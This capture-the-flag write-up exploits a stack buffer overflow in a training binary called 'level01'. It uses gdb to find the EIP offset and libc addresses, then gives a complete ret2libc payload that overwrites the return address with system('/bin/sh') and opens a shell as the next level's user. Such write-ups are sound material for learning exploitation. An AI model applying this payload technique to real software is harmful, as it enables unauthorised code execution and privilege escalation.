# Override Level01 Exploit Write-up

## 🛠️ Objective

The goal is to gain a shell using buffer overflow in the `level01` binary by overwriting the return address with a call to `system("/bin/sh")`.

---

## 🔍 Analyzing the Binary

### Launch `gdb` and disassemble `main()`

```bash
gdb -q ./level01
disas main
```

Look for two `fgets()` calls and the logic flow after checking return values of `verify_user_name` and `verify_user_pass`.

### Confirm logic with breakpoints

```gdb
b main
run
```

---

## 🧪 Testing the Vulnerability

Inside `main`, the second `fgets()` reads user input into a buffer of size 16 (on the stack), but accepts 100 bytes:

```c
char buffer[16];
fgets(buffer, 100, stdin); // overflow possible
```

So we can overwrite the saved return address (EIP).

---

## 🔎 Finding the Offset to EIP

To find the exact offset at which EIP is overwritten:

```bash
python -c 'print("dat_wil\n" + "A"*100)' > /tmp/input.txt
gdb ./level01
r < /tmp/input.txt
```

In GDB, if the crash occurs, use:

```gdb
info registers
```

You’ll see something like:

```
EIP: 0x41414141 ('AAAA')
```

Try different lengths (e.g., 76, 80, 84…) until EIP is overwritten with `0x42424242` (or any pattern you pick).

**In our case, the offset is 80 bytes.**

---

## 📍 Finding Addresses

### 1. `system()` address:

```gdb
find 0xf7e2c000, 0xf7fcc000, "system"
```

Example result:

```
0xf7e6aed0
```

Use:

```gdb
x/s 0xf7e6aed0
```

### 2. `exit()` address:

```gdb
info functions exit
x/s 0xf7e5eb70
```

### 3. String "/bin/sh":

```gdb
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
```

Result:

```
0xf7f897ec
```

---

## 🧨 Final Payload

Now construct the payload:

```bash
python -c 'print("dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' > /tmp/payload
```

Breakdown:

* `"dat_wil\n"`: valid username
* `"A"*80`: fill buffer up to return address
* `system()` address: `0xf7e6aed0`
* `exit()` address:   `0xf7e5eb70`
* `"/bin/sh"` string: `0xf7f897ec`

### Test it

```bash
(cat /tmp/payload; cat) | ./level01
```

If successful, you should get a shell:

```bash
whoami
level02
```

---

## 🧠 Summary

* Vulnerability: Buffer overflow on password input.
* Offset to EIP: 80 bytes.
* Overwritten return address → `system("/bin/sh")`.
* Used GDB to find real libc addresses dynamically.

---

✅ Done. You now have a working shell and root cause understanding.

---

